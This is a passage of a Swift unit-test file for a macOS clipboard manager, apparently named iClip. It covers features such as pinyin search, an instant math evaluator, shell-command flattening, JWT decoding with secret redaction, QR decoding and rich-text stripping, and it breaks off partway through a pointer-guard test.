    // MARK: - 17. 自然语言建议即时采纳与窗口始终在前状态测试

    @MainActor
    func testUserSuggestionNaturalLanguageAdoptionAndAlwaysOnTop() throws {
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-suggest-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)
        let store = ClipboardStore.shared
        let prevAlwaysOnTop = store.alwaysOnTop
        defer { store.alwaysOnTop = prevAlwaysOnTop }

        // 1. 自然语言开启「始终在前」与「微信免打扰」
        let r1 = engine.adoptUserSuggestion("开启窗口始终在前，并且在微信里不要弹提示", in: store)
        XCTAssertTrue(r1.adoptedImmediately)
        XCTAssertTrue(store.alwaysOnTop)
        XCTAssertTrue(engine.isSourceAppMuted("微信"))

        // 2. 自然语言开启「复制 PDF 自动愈合断行」并验证自动契约即时净化生效
        let r2 = engine.adoptUserSuggestion("以后复制 PDF 断行自动愈合段落", in: store)
        XCTAssertTrue(r2.adoptedImmediately)
        XCTAssertTrue(engine.enabledAutoRules.contains(.healPDFLineBreaks))

        let brokenPDF = "Artificial intelligence is transforming modern soft-\nware engineering workflows across every industry."
        let healed = try XCTUnwrap(engine.applyLearnedAutoTextRuleIfEnabled(rawText: brokenPDF, isLink: false))
        XCTAssertEqual(healed.rule, .healPDFLineBreaks)
        XCTAssertTrue(healed.text.contains("software engineering"))

        // 3. 开放式新需求自动沉淀至自省进化队列
        let r3 = engine.adoptUserSuggestion("希望后续增加按颜色色相筛选历史色值的功能", in: store)
        XCTAssertFalse(r3.adoptedImmediately)
        XCTAssertEqual(r3.record.status, .queuedForEvolution)
        XCTAssertEqual(engine.suggestions.count, 3)
    }

    // MARK: - 18. 多词跨维度组合搜索与免切输入法拼音/首字母检索测试

    func testMultiTokenCrossFieldAndPinyinInitialsSearch() {
        let invoiceItem = ClipItem(
            type: .text,
            text: "开票抬头：上海怀道科技有限公司\n纳税人识别号：91310000MA1K88888X",
            contentHash: "text:hd-invoice",
            sourceAppName: "飞书",
            isPinned: true,
            pinCategory: .invoice,
            customAlias: "总部税号"
        )
        let wechatImg = ClipItem(
            type: .image,
            imageFileName: "demo.png",
            imageWidth: 1200,
            imageHeight: 800,
            contentHash: "img:wx-shot",
            sourceAppName: "微信"
        )

        // 1. 多词空格跨维度组合匹配（来源应用 + 正文关键词 / 类型名）
        XCTAssertTrue(invoiceItem.matches(query: "飞书 913100"))
        XCTAssertTrue(invoiceItem.matches(query: "总部 怀道"))
        XCTAssertTrue(wechatImg.matches(query: "微信 图片"))
        XCTAssertFalse(wechatImg.matches(query: "微信 税号"))

        // 2. 免切中文输入法：英文全拼与拼音首字母秒搜
        XCTAssertTrue(invoiceItem.matches(query: "shhdkj"))     // 上海怀道科技 首字母
        XCTAssertTrue(invoiceItem.matches(query: "huaidao"))    // 怀道 全拼
        XCTAssertTrue(invoiceItem.matches(query: "zbsh"))       // 总部税号 备注首字母
        XCTAssertTrue(invoiceItem.matches(query: "feishu 9131"))// 飞书全拼 + 税号片段混合组合
        XCTAssertTrue(wechatImg.matches(query: "wx tp"))        // 微信 + 图片 双首字母组合
    }

    // MARK: - 19. 拖拽途中按 ⌥「光标旁微落点」载荷识别、内存样机与自然语言调教测试

    @MainActor
    func testCursorDropPodPayloadDetectionAndInMemoryMockup() throws {
        let dragPB = NSPasteboard.withUniqueName()
        defer { dragPB.releaseGlobally() }

        // 1. 纯文本拖拽识别为单槽模式（非图片）
        dragPB.clearContents()
        dragPB.setString("拖拽文本片段", forType: .string)
        XCTAssertFalse(CursorDropPodController.containsImageDragPayload(in: dragPB))

        // 2. 构造一张 16x16 内存 PNG 图像，验证识别为双槽图片模式且支持零磁盘 I/O 直出圆角阴影样机
        let img = NSImage(size: NSSize(width: 64, height: 48), flipped: false) { rect in
            NSColor.systemBlue.setFill()
            rect.fill()
            return true
        }
        let tiff = try XCTUnwrap(img.tiffRepresentation)
        let rep = try XCTUnwrap(NSBitmapImageRep(data: tiff))
        let pngData = try XCTUnwrap(rep.representation(using: .png, properties: [:]))

        dragPB.clearContents()
        dragPB.setData(pngData, forType: .png)
        XCTAssertTrue(CursorDropPodController.containsImageDragPayload(in: dragPB))

        let mockup = try XCTUnwrap(ImageStudioEngine.renderAppleMockupFrame(from: pngData))
        XCTAssertGreaterThan(mockup.byteCount, 100)

        // 3. 验证自然语言调教可随时关闭/开启光标旁微落点
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-droppod-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)
        XCTAssertTrue(engine.cursorDropPodEnabled)
        _ = engine.adoptUserSuggestion("关闭拖拽微落点", in: .shared)
        XCTAssertFalse(engine.cursorDropPodEnabled)
        _ = engine.adoptUserSuggestion("开启拖拽微落点", in: .shared)
        XCTAssertTrue(engine.cursorDropPodEnabled)
    }

    // MARK: - 20. 搜索框即时四则速算（精确小数除法/防日期误判/大写直出）与误删撤销测试

    @MainActor
    func testInstantMathEvaluatorAndSafetyGuards() throws {
        // 1. 浮点除法不丢小数、括号优先级与中文乘除号支持
        let r1 = try XCTUnwrap(InstantMathEvaluator.evaluate("5 / 2"))
        XCTAssertEqual(r1.plainValue, "2.5")
        XCTAssertEqual(r1.rmbUppercase, "贰元伍角整")

        let r2 = try XCTUnwrap(InstantMathEvaluator.evaluate("(3,200 + 800) × 1.13"))
        XCTAssertEqual(r2.plainValue, "4520")
        XCTAssertEqual(r2.formattedThousands, "4,520")
        XCTAssertEqual(r2.rmbUppercase, "肆仟伍佰贰拾元整")

        // 2. 边界安全守卫：半截算式、除以 0、ISO 日期与普通纯数字不触发误判且绝不崩溃
        XCTAssertNil(InstantMathEvaluator.evaluate("128 + "))
        XCTAssertNil(InstantMathEvaluator.evaluate("100 / 0"))
        XCTAssertNil(InstantMathEvaluator.evaluate("2026-11-23"))
        XCTAssertNil(InstantMathEvaluator.evaluate("91310000"))
    }

    // MARK: - 21. 全模态 Finder 速览（原图/实况文本/单行防执行压平）与原位微调回写无损测试

    @MainActor
    func testQuickLookTabsSingleLineFlattenAndInPlaceUpdate() throws {
        // 1. Shell 续行符与尾部换行安全压平（防止粘贴进终端直接回车执行）
        let shellCmd = """
        curl -X POST https://api.example.com/v1 \\
          -H "Authorization: Bearer token" \\
          -d '{"ok":true}'
        """
        XCTAssertTrue(QuickLookTextHelper.containsMultiLine(shellCmd))
        let flattened = QuickLookTextHelper.flattenToSingleLine(shellCmd + "\n")
        XCTAssertEqual(flattened, #"curl -X POST https://api.example.com/v1 -H "Authorization: Bearer token" -d '{"ok":true}'"#)
        XCTAssertFalse(flattened.contains("\n"))

        // 2. 图片速览页签构建：无 OCR 时仅展示「高清原图」，含 OCR 时自动生成「高清原图 + 实况文本」双页签
        let plainImg = ClipItem(type: .image, imageFileName: "a.png", contentHash: "img:1")
        let plainImgTabs = QuickLookTabBuilder.buildTabs(for: plainImg, store: .shared)
        XCTAssertEqual(plainImgTabs.map(\.id), ["image"])
        XCTAssertEqual(QuickLookTabBuilder.defaultTabIndex(for: plainImg, tabs: plainImgTabs), 0)

        let ocrImg = ClipItem(type: .image, imageFileName: "b.png", ocrText: "发票代码 044001900111", ocrChecked: true, contentHash: "img:2")
        let ocrImgTabs = QuickLookTabBuilder.buildTabs(for: ocrImg, store: .shared)
        XCTAssertEqual(ocrImgTabs.map(\.id), ["image", "ocr"])
        XCTAssertTrue(ocrImgTabs[1].supportsSaveBack)

        // 3. 原位微调回写（⌘S）：完整保留原 UUID、收藏、分组与备注名，并自动重判文本/链接类型与哈希
        let original = ClipItem(
            type: .text,
            text: "ssh -p 2222 root@10.0.0.8",
            contentHash: "text:old",
            sourceAppName: "Terminal",
            isPinned: true,
            pinCategory: .template,
            customAlias: "生产服 SSH"
        )
        let edited = try XCTUnwrap(ClipboardStore.updatedItem(from: original, withNewText: "ssh -p 22022 deploy@10.0.0.8"))
        XCTAssertEqual(edited.id, original.id)
        XCTAssertEqual(edited.type, .text)
        XCTAssertEqual(edited.text, "ssh -p 22022 deploy@10.0.0.8")
        XCTAssertNotEqual(edited.contentHash, original.contentHash)
        XCTAssertTrue(edited.isPinned)
        XCTAssertEqual(edited.pinCategory, .template)
        XCTAssertEqual(edited.customAlias, "生产服 SSH")
        XCTAssertTrue(edited.matches(query: "scf")) // 备注拼音首字母依旧秒搜

        let linkEdited = try XCTUnwrap(ClipboardStore.updatedItem(from: edited, withNewText: "https://github.com/fanaruto/iClip"))
        XCTAssertEqual(linkEdited.type, .link)
        XCTAssertTrue(linkEdited.contentHash.hasPrefix("link:"))
        XCTAssertNil(ClipboardStore.updatedItem(from: edited, withNewText: "   \n  "))

        let ocrEdited = try XCTUnwrap(ClipboardStore.updatedItem(from: ocrImg, withNewText: "发票代码 044001900999"))
        XCTAssertEqual(ocrEdited.ocrText, "发票代码 044001900999")
    }

    // MARK: - 22. 零离手「⌘C×2 原位智变」与「⌘C×3 无损还原」确定性状态机测试

    @MainActor
    func testDoubleCopySparkTriggerMachineDebounceAndThirdCopyRestore() throws {
        var sm = DoubleCopySparkStateMachine()
        let hash = "link:dirty-utm"

        // 1. 首次复制记录微星标在屏窗口（t = 10.0s，窗口 2.4s）
        XCTAssertEqual(sm.evaluateIncomingCopy(contentHash: hash, at: 10.0, doubleCopyEnabled: true), .normalCopy)
        sm.recordOffer(contentHash: hash, at: 10.0, windowSeconds: 2.4)

        // 2. < 140ms 内的机器双通道重写严格过滤，绝不误触发
        XCTAssertEqual(sm.evaluateIncomingCopy(contentHash: hash, at: 10.06, doubleCopyEnabled: true), .normalCopy)

        // 3. 人类真实第 2 次 ⌘C（t = 10.45s）直接零离手触发微星标转换
        XCTAssertEqual(sm.evaluateIncomingCopy(contentHash: hash, at: 10.45, doubleCopyEnabled: true), .triggerCandidate)
        XCTAssertNil(sm.activeHash)

        // 4. 短窗口内按下第 3 次 ⌘C（t = 11.10s）无损还原原始内容，并在随后 1.8s 内静默抑制重弹防止死循环
        XCTAssertEqual(sm.evaluateIncomingCopy(contentHash: hash, at: 11.10, doubleCopyEnabled: true), .restoreOriginal)
        XCTAssertEqual(sm.evaluateIncomingCopy(contentHash: hash, at: 11.60, doubleCopyEnabled: true), .suppressReoffer)
        XCTAssertEqual(sm.evaluateIncomingCopy(contentHash: hash, at: 13.20, doubleCopyEnabled: true), .normalCopy)

        // 5. 自然语言调教随时可开关「连按两次 ⌘C 触发智变」
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-dblcopy-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)
        XCTAssertTrue(engine.doubleCopySparkEnabled)
        _ = engine.adoptUserSuggestion("关闭双击复制触发", in: .shared)
        XCTAssertFalse(engine.doubleCopySparkEnabled)
        _ = engine.adoptUserSuggestion("开启连按复制智变", in: .shared)
        XCTAssertTrue(engine.doubleCopySparkEnabled)
    }

    // MARK: - 23. 跨处选段「⌃⌥C 续接复制（Copy-Append）」纯净换行衔接与自然语言调教测试

    @MainActor
    func testCopyAppendSegmentJoiningAndNaturalLanguageToggle() throws {
        // 1. 多段换行去重衔接（消除首尾多余空行，保留段内缩进）
        let s1 = CopyAppendHelper.joinSegments(base: "第一段摘要\n\n", incoming: "\n  - 第二段要点")
        XCTAssertEqual(s1, "第一段摘要\n  - 第二段要点")
        let s2 = CopyAppendHelper.joinSegments(base: s1, incoming: "  - 第三段结论")
        XCTAssertEqual(s2, "第一段摘要\n  - 第二段要点\n  - 第三段结论")
        XCTAssertEqual(CopyAppendHelper.joinSegments(base: "   ", incoming: "首段文本"), "首段文本")

        // 2. 支持从文本、文件路径与含 OCR 图片提取可追加内容
        let fileItem = ClipItem(type: .file, filePaths: ["/tmp/a.txt", "/tmp/b.txt"], contentHash: "file:ab")
        XCTAssertEqual(CopyAppendHelper.extractAppendableText(from: fileItem), "/tmp/a.txt\n/tmp/b.txt")
        let plainImg = ClipItem(type: .image, imageFileName: "x.png", contentHash: "img:x")
        XCTAssertNil(CopyAppendHelper.extractAppendableText(from: plainImg))

        // 3. 验证全局默认快捷键为 ⌃⌥C，且支持自然语言即时开关
        XCTAssertEqual(HotKeyShortcut.defaultCopyAppendShortcut.compactDisplayString, "⌃⌥C")
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-append-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)
        XCTAssertTrue(engine.copyAppendEnabled)
        _ = engine.adoptUserSuggestion("关闭续接复制", in: .shared)
        XCTAssertFalse(engine.copyAppendEnabled)
        _ = engine.adoptUserSuggestion("开启追加复制", in: .shared)
        XCTAssertTrue(engine.copyAppendEnabled)
    }

    #if !ICLIP_EDITION_FLOW
    // MARK: - 24. JWT 本地零上传 Base64URL 解码与 exp 过期诊断测试

    func testJWTOfflineBase64URLDecodeAndExpirationCheck() throws {
        // Header: {"alg":"HS256","typ":"JWT"}
        // Payload: {"sub":"u_42","role":"admin","exp":1893456000} (2030-01-01)
        let headerB64 = Data(#"{"alg":"HS256","typ":"JWT"}"#.utf8).base64EncodedString()
            .replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_").replacingOccurrences(of: "=", with: "")
        let payloadB64 = Data(#"{"sub":"u_42","role":"admin","exp":1893456000}"#.utf8).base64EncodedString()
            .replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_").replacingOccurrences(of: "=", with: "")
        let token = "Bearer \(headerB64).\(payloadB64).fake_signature_1234567890"

        let validRef = Date(timeIntervalSince1970: 1_700_000_000)
        let decodedValid = try XCTUnwrap(SemanticEngine.decodeJWTInspection(token, referenceDate: validRef))
        XCTAssertTrue(decodedValid.contains("（有效）"))
        XCTAssertTrue(decodedValid.contains("\"u_42\""))

        let expiredRef = Date(timeIntervalSince1970: 2_000_000_000)
        let decodedExpired = try XCTUnwrap(SemanticEngine.decodeJWTInspection(token, referenceDate: expiredRef))
        XCTAssertTrue(decodedExpired.contains("（已过期）"))

        // 验证 SemanticEngine.analyze 同时保留首位「脱敏粘贴」安全动作与「解码 JWT」动作
        let clip = ClipItem(type: .text, text: token, contentHash: "text:jwt")
        let snap = SemanticEngine.analyze(clip)
        XCTAssertEqual(snap.primaryKind, .sensitiveSecret)
        XCTAssertEqual(snap.actions.first?.id, "redact-secrets")
        XCTAssertTrue(snap.actions.contains(where: { $0.id == "jwt-decode" }))
    }
    #endif

    // MARK: - 25. 自然情景时间窗（今天/昨天/1h/7d/收藏）与 `!排除词` 零歧义组合检索测试

    func testEpisodicTimeScopeAndNegationTokenSearch() {
        let cal = Calendar.current
        let todayNoon = cal.date(bySettingHour: 14, minute: 0, second: 0, of: Date())!
        let thirtyMinsAgo = todayNoon.addingTimeInterval(-1_800)
        let yesterdayAfternoon = todayNoon.addingTimeInterval(-86_400)
        let tenDaysAgo = todayNoon.addingTimeInterval(-10 * 86_400)

        let recentWeChatImg = ClipItem(
            type: .image,
            imageFileName: "qr.png",
            contentHash: "img:qr",
            sourceAppName: "微信",
            createdAt: thirtyMinsAgo,
            isPinned: true,
            customAlias: "公司收款码"
        )
        let yesterdayCurl = ClipItem(
            type: .text,
            text: "curl -X POST https://api.example.com/v1?utm_source=test",
            contentHash: "text:curl",
            sourceAppName: "Terminal",
            createdAt: yesterdayAfternoon
        )
        let oldNote = ClipItem(
            type: .text,
            text: "十天前的历史会议备忘",
            contentHash: "text:old",
            sourceAppName: "备忘录",
            createdAt: tenDaysAgo
        )

        // 1. 情景时间窗 × 来源应用 × 类型自由组合检索
        XCTAssertTrue(recentWeChatImg.matches(query: "今天 微信 图片", now: todayNoon))
        XCTAssertTrue(recentWeChatImg.matches(query: "1h gsskm", now: todayNoon)) // 1小时内 + 公司收款码拼音首字母
        XCTAssertTrue(recentWeChatImg.matches(query: "收藏 收款", now: todayNoon))
        XCTAssertFalse(yesterdayCurl.matches(query: "今天", now: todayNoon))
        XCTAssertTrue(yesterdayCurl.matches(query: "昨天 curl", now: todayNoon))
        XCTAssertTrue(yesterdayCurl.matches(query: "本周 terminal", now: todayNoon))
        XCTAssertFalse(oldNote.matches(query: "本周", now: todayNoon))

        // 2. `!排除词` 精准反向过滤，且绝不误伤命令行 `-X` 参数检索
        XCTAssertTrue(yesterdayCurl.matches(query: "curl -X", now: todayNoon))
        XCTAssertFalse(yesterdayCurl.matches(query: "curl !utm_source", now: todayNoon))
        XCTAssertTrue(recentWeChatImg.matches(query: "今天 !terminal", now: todayNoon))
    }

    // MARK: - 26. 目标窗口情境记忆（Target App Affinity）与第一性相关度检索引擎测试

    @MainActor
    func testSmartSearchRankerAliasPriorityAndTargetAppAffinity() throws {
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-smartrank-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)

        let now = Date()
        // 刚刚复制的无关长文（偶然提到「税号」二字，时间最新）
        let noisyArticle = ClipItem(
            type: .text,
            text: String(repeating: "这是一段普通的行业新闻摘要，文末顺便提到了请核对企业税号是否变更。", count: 15),
            contentHash: "text:noisy-article",
            sourceAppName: "Safari",
            createdAt: now
        )
        // 三天前收藏并设置备注别名的真正税号条目
        let pinnedTaxID = ClipItem(
            type: .text,
            text: "91310000MA1K88888X",
            contentHash: "text:real-tax",
            sourceAppName: "飞书",
            createdAt: now.addingTimeInterval(-3 * 86_400),
            isPinned: true,
            customAlias: "总部税号"
        )

        // 1. 搜「税号」或备注拼音首字母「zbsh」时，精准备注收藏必须排在无关新长文之前（#1）
        let byKeyword = SmartSearchRanker.rankSearchResults([noisyArticle, pinnedTaxID], query: "税号", targetApp: nil, engine: engine)
        XCTAssertEqual(byKeyword.map(\.id), [pinnedTaxID.id, noisyArticle.id])

        let byAliasPinyin = SmartSearchRanker.rankSearchResults([noisyArticle, pinnedTaxID], query: "zbsh", targetApp: nil, engine: engine)
        XCTAssertEqual(byAliasPinyin.map(\.id), [pinnedTaxID.id, noisyArticle.id])

        // 2. 纯时间筛选词（如「今天」）严守时间倒序铁律，绝不乱排
        let secondRecent = ClipItem(type: .text, text: "今天较早记录", contentHash: "text:t2", createdAt: now.addingTimeInterval(-600))
        let pureTimeRanked = SmartSearchRanker.rankSearchResults([noisyArticle, secondRecent], query: "今天", targetApp: "微信", engine: engine)
        XCTAssertEqual(pureTimeRanked.map(\.id), [noisyArticle.id, secondRecent.id])

        // 3. 目标窗口情境分流：在「微信」搜地址置顶收货地址，在「Terminal」搜地址置顶服务器地址
        let officeAddr = ClipItem(
            type: .text,
            text: "地址：上海市浦东新区张江高科园区 88 号（收件人王经理）",
            contentHash: "text:addr-wx",
            createdAt: now.addingTimeInterval(-3600),
            isPinned: true
        )
        let serverAddr = ClipItem(
            type: .text,
            text: "地址：10.24.0.88:5432（生产只读库）",
            contentHash: "text:addr-term",
            createdAt: now.addingTimeInterval(-1800),
            isPinned: true
        )

        engine.recordPasteToTargetApp(contentHash: officeAddr.contentHash, targetApp: "微信")
        engine.recordPasteToTargetApp(contentHash: officeAddr.contentHash, targetApp: "微信")
        engine.recordPasteToTargetApp(contentHash: serverAddr.contentHash, targetApp: "Terminal")
        engine.recordPasteToTargetApp(contentHash: serverAddr.contentHash, targetApp: "Terminal")
        engine.recordPasteToTargetApp(contentHash: serverAddr.contentHash, targetApp: "Terminal")

        let inWeChat = SmartSearchRanker.rankSearchResults([serverAddr, officeAddr], query: "地址", targetApp: "微信", engine: engine)
        XCTAssertEqual(inWeChat.first?.id, officeAddr.id)

        let inTerminal = SmartSearchRanker.rankSearchResults([officeAddr, serverAddr], query: "地址", targetApp: "Terminal", engine: engine)
        XCTAssertEqual(inTerminal.first?.id, serverAddr.id)

        // 4. 收藏夹无搜索情境置顶与紧凑微标签（✦ 微信常用 / ✦ Chrome常用）
        let pinnedForWeChat = SmartSearchRanker.rankPinnedItemsForContext([pinnedTaxID, serverAddr, officeAddr], targetApp: "微信", engine: engine)
        XCTAssertEqual(pinnedForWeChat.first?.id, officeAddr.id)
        XCTAssertEqual(engine.preferredTargetAppBadge(for: officeAddr.contentHash, activeTargetApp: "微信"), "✦ 微信常用")
        XCTAssertNil(engine.preferredTargetAppBadge(for: officeAddr.contentHash, activeTargetApp: "Terminal"))

        // 未建立习惯的目标应用完全保持原始收藏顺序
        let pinnedForSafari = SmartSearchRanker.rankPinnedItemsForContext([pinnedTaxID, serverAddr, officeAddr], targetApp: "Safari", engine: engine)
        XCTAssertEqual(pinnedForSafari.map(\.id), [pinnedTaxID.id, serverAddr.id, officeAddr.id])

        // 5. 自然语言调教一键关闭情境智能排序后立即恢复原始时间序
        _ = engine.adoptUserSuggestion("关闭智能排序", in: .shared)
        XCTAssertFalse(engine.smartContextRankingEnabled)
        let rawOrder = SmartSearchRanker.rankSearchResults([noisyArticle, pinnedTaxID], query: "税号", targetApp: "微信", engine: engine)
        XCTAssertEqual(rawOrder.map(\.id), [noisyArticle.id, pinnedTaxID.id])
    }

    // MARK: - 27. 全角色零手机「二维码直解（QR Code Instant Decode）」与离线实况文本贯通测试

    @MainActor
    func testOfflineQRCodeInstantDecodeSparkPriorityAndCrossRoleOCRSearch() throws {
        // 1. 使用 CoreImage 在内存合成一张带安静区边框的真实二维码 PNG，验证 Apple Vision 离线精准解出原始链接
        let expectedURL = "https://github.com/fanaruto/iClip"
        let qrFilter = try XCTUnwrap(CIFilter(name: "CIQRCodeGenerator"))
        qrFilter.setValue(Data(expectedURL.utf8), forKey: "inputMessage")
        qrFilter.setValue("M", forKey: "inputCorrectionLevel")
        let ciRaw = try XCTUnwrap(qrFilter.outputImage)
        let scaled = ciRaw.transformed(by: CGAffineTransform(scaleX: 12, y: 12))
        let ciCtx = CIContext()
        let qrCG = try XCTUnwrap(ciCtx.createCGImage(scaled, from: scaled.extent))
        let rep = NSBitmapImageRep(cgImage: qrCG)
        let qrPNG = try XCTUnwrap(rep.representation(using: .png, properties: [:]))

        let decodedPayload = VisionOCRService.detectBarcodesFast(in: qrPNG)
        XCTAssertEqual(decodedPayload, expectedURL)

        // 2. 验证含二维码与实况文本的图片在双角色（Dev & Flow）中均支持 @qr / 二维码 / 图内中英与拼音首字母秒搜
        let qrShot = ClipItem(
            type: .image,
            imageFileName: "login-qr.png",
            ocrText: "扫码登录企业控制台",
            ocrChecked: true,
            qrCodePayload: expectedURL,
            contentHash: "img:qr-login",
            sourceAppName: "Google Chrome"
        )
        XCTAssertTrue(qrShot.matches(query: "二维码"))
        XCTAssertTrue(qrShot.matches(query: "@qr github"))
        XCTAssertTrue(qrShot.matches(query: "smdl")) // 扫码登录 拼音首字母（Dev 版同步解锁）
        XCTAssertTrue(qrShot.subtitleInfo.hasPrefix("二维码："))

        // 3. 验证 QuickLook 自动生成「高清原图 + 二维码内容 + 实况文本」三页签
        let qlTabs = QuickLookTabBuilder.buildTabs(for: qrShot, store: .shared)
        XCTAssertEqual(qlTabs.map(\.id), ["image", "qrcode", "ocr"])
        XCTAssertEqual(qlTabs[1].textValue, expectedURL)

        // 4. 验证微星标对二维码截图最高优推荐「提取二维码链接」，且支持自然语言调教开启二维码自动提取与截图优先提字
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-qr-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)

        let spark = try XCTUnwrap(engine.evaluateSparkCandidate(for: qrShot, reuseCount: 1, minimalMode: false))
        XCTAssertEqual(spark.actionID, "img-qrcode")
        XCTAssertEqual(spark.shortTitle, "提取二维码链接")

        _ = engine.adoptUserSuggestion("复制二维码自动提取，普通截图优先提取文字", in: .shared)
        XCTAssertTrue(engine.enabledAutoRules.contains(.extractQRCode))

        let textShot = ClipItem(type: .image, imageFileName: "err.png", ocrText: "Fatal error: Index out of range", ocrChecked: true, contentHash: "img:err")
        let textSpark = try XCTUnwrap(engine.evaluateSparkCandidate(for: textShot, reuseCount: 1, minimalMode: false))
        XCTAssertEqual(textSpark.actionID, "img-ocr")
    }

    // MARK: - 28. 内建 Pure Paste：富文本脏样式无损嗅探、电子表格分列保护与免打扰应用豁免测试

    @MainActor
    func testRichTextFormattingDetectionSpreadsheetGuardAndAutoPurePaste() throws {
        // 1. 识别网页 HTML / IDE RTF 富文本，但严格保护 Excel/Numbers (.tabularText) 与 TSV 二维表格
        XCTAssertTrue(RichTextPasteboardHelper.hasStrippableRichFormatting(
            types: [.string, .html],
            plainText: "这是一段来自网页带大字号红底的文字"
        ))
        XCTAssertTrue(RichTextPasteboardHelper.hasStrippableRichFormatting(
            types: [.string, .rtf],
            plainText: "let status = 200"
        ))
        XCTAssertFalse(RichTextPasteboardHelper.hasStrippableRichFormatting(
            types: [.string],
            plainText: "干净纯文本"
        ))
        XCTAssertFalse(RichTextPasteboardHelper.hasStrippableRichFormatting(
            types: [.string, .html, .tabularText],
            plainText: "姓名\t金额\n张三\t1200"
        ))
        XCTAssertFalse(RichTextPasteboardHelper.hasStrippableRichFormatting(
            types: [.string, .html],
            plainText: "季度\t营收\t利润\nQ1\t500\t120"
        ))

        // 2. 微星标在普通富文本复制时提供「净化为纯文本」，连续使用 2 次后解锁自动契约晋升
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-purepaste-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)

        let styledNote = ClipItem(type: .text, text: "明天下午三点产品评审", contentHash: "text:styled", sourceAppName: "Google Chrome")
        XCTAssertNil(engine.evaluateSparkCandidate(for: styledNote, reuseCount: 1, minimalMode: false, hasRichFormatting: false))

        let firstSpark = try XCTUnwrap(engine.evaluateSparkCandidate(for: styledNote, reuseCount: 1, minimalMode: false, hasRichFormatting: true))
        XCTAssertEqual(firstSpark.actionID, "strip-rich-style")
        XCTAssertNil(firstSpark.promotableRule)

        engine.recordActionUsed(actionID: "strip-rich-style", sourceApp: "Google Chrome")
        engine.recordActionUsed(actionID: "strip-rich-style", sourceApp: "Google Chrome")
        let promotedSpark = try XCTUnwrap(engine.evaluateSparkCandidate(for: styledNote, reuseCount: 2, minimalMode: false, hasRichFormatting: true))
        XCTAssertEqual(promotedSpark.promotableRule, .stripRichTextFormatting)

        // 3. 自然语言开启「自动纯文本」后生效，且对设为免打扰的来源应用（如飞书）自动豁免保留原富文本
        _ = engine.adoptUserSuggestion("开启自动纯文本，在飞书里不要弹提示", in: .shared)
        XCTAssertTrue(engine.enabledAutoRules.contains(.stripRichTextFormatting))
        XCTAssertTrue(engine.shouldAutoStripRichFormatting(hasRichFormatting: true, sourceApp: "Google Chrome"))
        XCTAssertFalse(engine.shouldAutoStripRichFormatting(hasRichFormatting: true, sourceApp: "飞书"))
    }

    // MARK: - 29. 一行闪念速记（`> 备注 :: 正文`）零歧义解析与双角色动态模板（`{{date}} {{weekday}}`）测试

    func testQuickCaptureParserAndCrossRoleSnippetTemplateEngine() throws {
        // 1. 闪念速记与「备注 :: 正文」一步收藏拆解
        let c1 = try XCTUnwrap(QuickCaptureParser.parse(from: "> 下午4点找财务领发票"))
        XCTAssertNil(c1.customAlias)
        XCTAssertEqual(c1.bodyText, "下午4点找财务领发票")
        XCTAssertFalse(c1.defaultPin)

        let c2 = try XCTUnwrap(QuickCaptureParser.parse(from: "> 总部税号 :: 91310000MA1K88888X"))
        XCTAssertEqual(c2.customAlias, "总部税号")
        XCTAssertEqual(c2.bodyText, "91310000MA1K88888X")
        XCTAssertTrue(c2.defaultPin)

        let c3 = try XCTUnwrap(QuickCaptureParser.parse(from: "@新建 客服话术：：您好 {{clip}}，今日（{{date}} {{weekday}}）已为您寄出"))
        XCTAssertEqual(c3.customAlias, "客服话术")
        XCTAssertTrue(c3.defaultPin)

        // 2. 边界防误伤：区号手机号、代码 >= 符号与既有 @pin/@json 筛选词绝不误判为速记指令
        XCTAssertNil(QuickCaptureParser.parse(from: "+8613800138000"))
        XCTAssertNil(QuickCaptureParser.parse(from: "a >= b"))
        XCTAssertNil(QuickCaptureParser.parse(from: ">= 100"))
        XCTAssertNil(QuickCaptureParser.parse(from: "@pin"))
        XCTAssertNil(QuickCaptureParser.parse(from: "@json"))

        // 3. 双角色全量动态模板插值（含 {{date}}、{{weekday}}、{{clip}} 与 {{clip_redacted}}）
        var comps = DateComponents()
        comps.year = 2026
        comps.month = 11
        comps.day = 23
        comps.hour = 9
        comps.minute = 30
        comps.second = 0
        let fixedMonday = try XCTUnwrap(Calendar(identifier: .gregorian).date(from: comps))

        XCTAssertTrue(SnippetTemplateEngine.containsPlaceholders(c3.bodyText))
        let rendered = SnippetTemplateEngine.render(
            template: c3.bodyText,
            latestContextText: "王先生",
            referenceDate: fixedMonday
        )
        XCTAssertEqual(rendered, "您好 王先生，今日（2026-11-23 星期一）已为您寄出")
    }

    // MARK: - 30. 键鼠防冲突守卫（`PointerSelectionGuard`）、`⌥1~⌥6` 类目直达与历史资产原子自愈测试

    func testPointerSelectionGuardOptionTabsAndHistorySelfHealing() throws {
        // 1. 静止鼠标与微抖动绝不抢走面板唤起/键盘导航焦点；真实移动 >= 3.5pt 立即解锁接管
        var guardState = PointerSelectionGuard()
        XCTAssertFalse(guardState.isLocked)
